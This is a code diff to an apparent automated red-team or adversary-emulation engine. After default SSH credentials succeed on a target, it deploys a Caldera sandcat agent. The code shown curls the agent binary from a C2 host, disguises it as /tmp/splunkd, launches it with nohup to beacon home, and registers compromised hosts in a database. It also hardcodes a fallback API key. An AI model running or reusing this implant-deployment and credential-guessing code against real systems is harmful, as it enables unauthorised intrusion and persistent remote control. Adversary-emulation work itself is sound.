@@ -73,7 +73,7 @@ class InitialAccessEngine:
         ``_DEFAULT_CREDS`` is tried in order; the first success is returned.
         A credential fact is written to the DB on success regardless of mode.
         """
-        if settings.MOCK_CALDERA:
+        if settings.MOCK_C2_ENGINE:
             return await self._mock_ssh_result(
                 db=db,
                 operation_id=operation_id,
@@ -98,7 +98,7 @@ class InitialAccessEngine:
         self,
         ip: str,
         credential: tuple[str, str],
-        caldera_host: str,
+        c2_host: str,
     ) -> bool:
         """Deploy and start a Caldera sandcat agent on the remote host via SSH.
 
@@ -108,7 +108,7 @@ class InitialAccessEngine:
             Target IP address.
         credential:
             ``(username, password)`` tuple.
-        caldera_host:
+        c2_host:
             Full ``scheme://host:port`` of the Caldera server, e.g.
             ``http://172.17.0.1:58888``.
 
@@ -137,11 +137,11 @@ class InitialAccessEngine:
                 else:
                     sandcat_file = "sandcat.go-linux"
 
-                api_key = _settings.CALDERA_API_KEY or "ADMIN123456"
+                api_key = _settings.C2_ENGINE_API_KEY or "ADMIN123456"
 
                 # Download sandcat binary
                 download_result = await conn.run(
-                    f"curl -s -X POST {caldera_host}/file/download"
+                    f"curl -s -X POST {c2_host}/file/download"
                     f" -H 'platform: linux'"
                     f" -H 'file: {sandcat_file}'"
                     f" -H 'Authorization: {api_key}'"
@@ -195,17 +195,18 @@ class InitialAccessEngine:
                 await conn.run("chmod +x /tmp/splunkd", check=True)
                 # Launch agent in background
                 await conn.run(
-                    f"nohup /tmp/splunkd -server {caldera_host} -group red"
+                    f"nohup /tmp/splunkd -server {c2_host} -group red"
                     f" > /tmp/splunkd.log 2>&1 &",
                     check=True,
                 )
                 logger.info(
                     "Caldera sandcat launched on %s (arch=%s, kernel=%s, file=%s, callback=%s)",
-                    ip, arch, kernel_str, sandcat_file, caldera_host,
+                    ip, arch, kernel_str, sandcat_file, c2_host,
                 )
 
-            # Wait for agent to beacon home
-            await asyncio.sleep(30)
+            # Wait for agent to beacon home (skip in test/mock-beacon mode)
+            if not _settings.C2_MOCK_BEACON:
+                await asyncio.sleep(30)
             return True
 
         except Exception:
@@ -217,6 +218,43 @@ class InitialAccessEngine:
     # ------------------------------------------------------------------
     # Internal helpers
     # ------------------------------------------------------------------
+
+    async def _register_ssh_agent(
+        self,
+        db: aiosqlite.Connection,
+        operation_id: str,
+        target_id: str,
+        ip_address: str,
+        credential: str,
+    ) -> None:
+        """Register a synthetic SSH agent record after successful SSH login.
+
+        This creates an 'alive' agent entry so the OODA Act phase can route
+        techniques via DirectSSHEngine without requiring a real Caldera agent beacon.
+        paw format: 'SSH-{ip_address}'
+        """
+        from datetime import datetime
+        from uuid import uuid4
+
+        paw = f"SSH-{ip_address}"
+        privilege = "root" if credential.startswith("root:") else "user"
+
+        await db.execute(
+            """
+            INSERT OR REPLACE INTO agents
+                (id, paw, host_id, status, privilege, platform, operation_id, last_beacon)
+            VALUES (?, ?, ?, 'alive', ?, 'linux', ?, ?)
+            """,
+            (
+                str(uuid4()),
+                paw,
+                target_id,
+                privilege,
+                operation_id,
+                datetime.now().isoformat(),
+            ),
+        )
+        await db.commit()
 
     async def _mock_ssh_result(
         self,
@@ -320,6 +358,27 @@ class InitialAccessEngine:
                     logger.info(
                         "SSH login succeeded for %s@%s:%s", username, ip, port
                     )
+
+                    # Register SSH agent record (enables DirectSSHEngine routing)
+                    await self._register_ssh_agent(
+                        db,
+                        operation_id,
+                        target_id,
+                        ip,
+                        f"{username}:{password}",
+                    )
+
+                    # Bootstrap Caldera agent only when EXECUTION_ENGINE=caldera
+                    if settings.EXECUTION_ENGINE == "caldera":
+                        c2_host = (
+                            settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
+                        )
+                        await self.bootstrap_caldera_agent(
+                            ip=ip,
+                            credential=(username, password),
+                            c2_host=c2_host,
+                        )
+
                     return InitialAccessResult(
                         success=True,
                         method="ssh_credential",
